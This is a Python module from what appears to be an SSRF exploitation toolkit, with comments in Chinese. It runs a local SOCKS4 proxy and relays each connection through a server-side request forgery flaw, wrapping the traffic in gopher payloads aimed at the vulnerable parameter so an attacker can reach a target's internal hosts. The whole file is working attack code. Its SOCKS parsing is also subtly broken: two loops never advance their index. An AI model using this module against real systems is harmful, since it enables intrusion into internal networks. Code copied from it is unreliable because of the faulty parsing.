import _thread
import binascii
import logging
import urllib.parse
from urllib.request import urlopen

from core.utils import *

# 注意
# 由于 SSRF 漏洞的特性，
# 一次请求只能得到一次响应，
# 也无法获得交互式 shell。

# $ cat /etc/proxychains.conf
# [ProxyList]
# socks4  127.0.0.1 9000

name = "socksproxy"
description = "SOCKS 代理 - Socks4"
author = "Swissky"
documentation = [
    "https://github.com/iamultra/ssrfsocks",
    "https://media.blackhat.com/bh-us-12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_Slides.pdf",
]


class exploit:
    SOCKS = True
    HOST = "localhost"
    PORT = 9000
    BUFSIZ = 4096
    TIMEOUT = 5

    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.HOST, self.PORT))
        server.listen(2)
        logging.info(f"监听器已在端口 {self.PORT} 就绪")
        try:
            while 1:
                client, addr = server.accept()
                _thread.start_new_thread(self.child, (client, addr, requester, args))
        except KeyboardInterrupt:
            server.close()

    def child(self, sock, addr, requester, args):

        if self.SOCKS:
            req = sock.recv(self.BUFSIZ)
            host, port, extra = self.decodesocks(req)
            if extra == "":
                dest = socket.inet_ntoa(host.encode())
            else:
                dest = extra

            (destport,) = struct.unpack("!H", port.encode())
            sock.send(("\x00\x5a" + port + host).encode())

        data = sock.recv(self.BUFSIZ)

        try:
            encodeddata = urllib.parse.quote(data)
            payload = wrapper_gopher(encodeddata, dest, str(destport))
            r = requester.do_request(args.param, payload)

            if r.text != None:
                sock.send(r.text.encode())
            sock.close()

        except Exception as e:
            logging.error(e)
            sock.close()

    def decodesocks(self, req):
        req = req.decode()

        if req[0] != "\x04":
            raise Exception("错误的版本号")
        if req[1] != "\x01":
            raise Exception("仅支持 TCP 流")

        port = req[2:4]
        host = req[4:8]
        if host[0] == "\x00" and host[1] == "\x00" and host[2] == "\x00" and host[3] != "\x00":
            byname = True
        else:
            byname = False

        # 注意：似乎没有用处
        userid = ""
        i = 8
        while req[i] != "\x00":
            userid += req[i]
        extra = ""

        if byname:
            while req[i] != "\x00":
                extra += req[i]

        return host, port, extra
